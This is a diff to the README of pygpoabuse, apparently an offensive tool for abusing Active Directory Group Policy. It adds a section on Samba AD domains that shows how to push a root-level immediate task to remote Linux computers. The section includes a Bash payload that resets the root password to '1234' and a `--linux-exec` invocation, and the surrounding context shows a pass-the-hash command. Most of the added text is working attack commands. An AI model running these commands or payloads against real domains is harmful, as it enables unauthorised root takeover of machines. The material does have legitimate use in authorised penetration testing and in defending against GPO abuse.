@@ -40,6 +40,24 @@ Delete the scheduled task after it executed.
 ./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" --cleanup
 ```
 
+### Samba AD Usage  
+
+This tool also can be used with Samba AD Domains. It will create an **immediate job** as **root** on the remote computer for computer GPO.  
+
+First, create a Bash script or ELF file.  
+
+```
+#!/bin/bash
+echo "root:1234" | chpasswd
+```
+
+Then execute tool with `--linux-exec` argument.  
+
+```
+./pygpoabuse.py DOMAIN/user:password -gpo-id "12345677-ABCD-9876-ABCD-123456789012" --linux-exec /path/to/executable
+```
+
+![Example](https://github.com/user-attachments/assets/173baf0b-e502-4424-bdf6-f97ed0e042af)
 
 ## Credits
 
